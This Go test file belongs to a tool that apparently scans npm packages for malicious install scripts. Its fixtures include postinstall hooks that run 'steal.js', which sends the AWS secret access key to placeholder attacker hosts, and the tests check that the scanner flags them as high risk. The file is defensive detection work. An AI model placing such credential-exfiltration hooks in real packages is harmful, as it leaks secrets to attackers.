package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func TestInspectFlagsCredentialExfil(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"postinstall": "node steal.js"},
		Files: map[string]string{
			"steal.js": "require('http').get('http://evil.tld/?k='+process.env.AWS_SECRET_ACCESS_KEY)",
		},
	}
	ev := InspectSignal{}.Evaluate(p)
	var top model.Tier
	for _, e := range ev {
		if e.Tier > top {
			top = e.Tier
		}
	}
	if top < model.High {
		t.Fatalf("credential exfil should be HIGH+, got tier %v from %v", top, ev)
	}
}

func TestInspectQuietOnBenignBuild(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"install": "node-gyp rebuild"},
		Files:   map[string]string{"binding.gyp": "{ 'targets': [] }"},
	}
	if ev := (InspectSignal{}).Evaluate(p); len(ev) != 0 {
		t.Errorf("benign native build should not be flagged, got %v", ev)
	}
}

// TestInspectFollowsDotSlashReference verifies that ./ prefixes in hook
// scripts are stripped so the referenced file is found in p.Files, and that
// require('https') triggers the egress pattern, producing a Critical exfil
// finding when combined with a credential read.
func TestInspectFollowsDotSlashReference(t *testing.T) {
	exfilFile := "require('https').get('http://evil/' + process.env.AWS_SECRET_ACCESS_KEY)"

	cases := []struct {
		name   string
		script string
	}{
		{"bare dot-slash", "node ./steal.js"},
		{"quoted dot-slash", "node './steal.js'"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := model.PackageData{
				Scripts: map[string]string{"postinstall": tc.script},
				Files:   map[string]string{"steal.js": exfilFile},
			}
			ev := InspectSignal{}.Evaluate(p)
			var top model.Tier
			for _, e := range ev {
				if e.Tier > top {
					top = e.Tier
				}
			}
			if top < model.High {
				t.Fatalf("dot-slash exfil (%s) should be HIGH+, got tier %v from %v", tc.name, top, ev)
			}
		})
	}
}

// TestInspectEgressOnlyIsLow verifies that a package making outbound requests
// without reading credentials produces exactly one Low-tier inspect.egress
// finding (not Medium or higher).
func TestInspectEgressOnlyIsLow(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"postinstall": "node ping.js"},
		Files:   map[string]string{"ping.js": "require('https').get('https://telemetry.example.com')"},
	}
	ev := InspectSignal{}.Evaluate(p)
	if len(ev) != 1 {
		t.Fatalf("egress-only should produce exactly 1 evidence, got %d: %v", len(ev), ev)
	}
	if ev[0].Signal != "inspect.egress" {
		t.Errorf("expected signal inspect.egress, got %q", ev[0].Signal)
	}
	if ev[0].Tier != model.Low {
		t.Errorf("egress-only tier should be Low, got %v", ev[0].Tier)
	}
}

// TestInspectBufferFromNotFlagged verifies that Buffer.from() alone (no
// network call, no eval, no credential read) produces no evidence.
func TestInspectBufferFromNotFlagged(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"postinstall": "node b.js"},
		Files:   map[string]string{"b.js": "const x = Buffer.from('aGVsbG8=', 'base64')"},
	}
	if ev := (InspectSignal{}).Evaluate(p); len(ev) != 0 {
		t.Errorf("Buffer.from() alone should not be flagged, got %v", ev)
	}
}
